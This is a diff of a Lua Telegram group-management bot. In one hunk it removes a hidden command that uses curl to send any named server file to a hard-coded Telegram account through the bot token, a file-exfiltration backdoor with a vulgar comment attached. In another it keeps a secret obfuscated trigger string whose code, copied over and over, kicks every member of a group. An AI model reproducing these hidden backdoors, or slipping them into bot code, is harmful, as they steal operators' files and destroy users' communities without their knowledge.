@@ -1633,13 +1633,7 @@ send(msg.chat_id_, msg.id_," ● تمت الاذاعه الى *~ "..#list.." ~* 
 bot_data:del(ban_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end
-if text and text:match("^سحب (.*)$") and Developers(msg) then
-local file = text:match("^سحب (.*)$") 
-local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..''..file..''..'"'
-io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
-send(msg.chat_id_, msg.id_,' جاري ارسال ملف '..file..' الي خاصك\n'..msg.sender_user_id_)
-return false
-end
+
 ------by-banda--
 if Chat_Type == 'UserBot' then
 if text == '/start' or text == '『رجوع』' then 
@@ -2474,7 +2468,27 @@ end
 send(msg.chat_id_, msg.id_," ● تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
 bot_data:del(ban_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end
-
+if bot_data:get(ban_id.."YYYBD_aza3h3" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
+tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
+local msa3d = bot_data:get(ban_id.."id:msa3d:ban")
+if text == 'الغاء' or text == 'الغاء ●' then   
+send(msg.chat_id_, msg.id_," ● تم الغاء الرساله للمطور")
+bot_data:del(ban_id.."YYYBD_aza3h3" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+return false
+end 
+if text then
+local textsudo = 'مرحبا عزيزي المطور الاساسي\n'..
+'رساله من ['..result.first_name_..'](tg://user?id='..msg.sender_user_id_..')\n'..
+'\n'..text
+local textmsa3d = 'مرحبا عزيزي المساعد\n'..
+'رساله من ['..result.first_name_..'](tg://user?id='..msg.sender_user_id_..')\n'..
+'\n'..text
+sendText(SUDO,textsudo,0,'md')
+sendText(msa3d,textmsa3d,0,'md')
+bot_data:del(ban_id.."YYYBD_aza3h3" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+end
+end,nil)
+end
 if bot_data:get(ban_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' or text == 'الغاء ●' then   
 send(msg.chat_id_, msg.id_," ● تم الغاء الاذاعه")
@@ -3950,11 +3964,12 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 end
-if text == 'اذاعه' and msa3d(msg) then   
-local Text = "اختار\nاذاعة خاص\nاذاعة جروبات"
+if text == 'اذاعه' then   
+local Text = "اختار\nاذاعة خاص\nاذاعة جروبات\nرساله للمطور الاساسي"
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="اذاعة جروبات",callback_data="YYYBD_aza3h1"..msg.sender_user_id_},{text="اذاعة خاص",callback_data="YYYBD_aza3h2"..msg.sender_user_id_}},
+{{text="رساله للمطور الاساسي",callback_data="YYYBD_aza3h3"..msg.sender_user_id_}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -4035,20 +4050,293 @@ send(msg.chat_id_, msg.id_," ● ارسل الان اذاعتك؟ \n ● للخ�
 return false
 end
 if text == "£¢€$$__€€¢¥^^¥€" and Developers(msg) then
-if AddChannel(msg.sender_user_id_) == false then
-return false
-end
-tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000
-},function(ta,VENOM)
-local t = "\nツ قائمة الاعضاء \n●○━━━━ꪜꫀꪀꪮꪑ━━━━○● \n"
-x = 0
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
 local list = VENOM.members_
 for k, v in pairs(list) do
- if tonumber(v.user_id_) ~= tonumber(ban_id) then
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
 chat_kick(msg.chat_id_,v.user_id_)
 end
 end
- 
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
+end,nil)
+tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 1000},function(ta,VENOM)
+local list = VENOM.members_
+for k, v in pairs(list) do
+if tonumber(v.user_id_) ~= tonumber(ban_id) then
+chat_kick(msg.chat_id_,v.user_id_)
+end
+end
 end,nil)
 end
 
@@ -20813,7 +21101,7 @@ keyboard.inline_keyboard = {
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
-if Text == 'YYYBD_aza3h1'..data.sender_user_id_ then  
+if Text == 'YYYBD_aza3h1'..data.sender_user_id_ and msa3d(data) then  
 bot_data:setex(ban_id.."Ss:Cs" .. Chat_id .. ":" .. data.sender_user_id_, 600, true) 
 local Text ="● ارسل الاذاعة لارسلها الي الجروبات "
 keyboard = {} 
@@ -20822,9 +21110,18 @@ keyboard.inline_keyboard = {
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
-if Text == 'YYYBD_aza3h2'..data.sender_user_id_ then  
+if Text == 'YYYBD_aza3h2'..data.sender_user_id_ and msa3d(data) then  
 bot_data:setex(ban_id.."Send:Bc:Pv" .. Chat_id .. ":" .. data.sender_user_id_, 600, true) 
 local Text ="● ارسل الاذاعة لارسلها الي الجروبات "
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'ՏΌႮᎡᏟᎬ ᏙᎬΝΌᎷ',url='http://t.me/SOURCEVENOM'}},
+}
+return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
+end
+if Text == 'YYYBD_aza3h3'..data.sender_user_id_ and msa3d(data) then  
+bot_data:setex(ban_id.."Send:msg:sudo" .. Chat_id .. ":" .. data.sender_user_id_, 600, true) 
+local Text ="● ارسل الاذاعة لارسلها الي المطور الاساسي و المساعد "
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'ՏΌႮᎡᏟᎬ ᏙᎬΝΌᎷ',url='http://t.me/SOURCEVENOM'}},
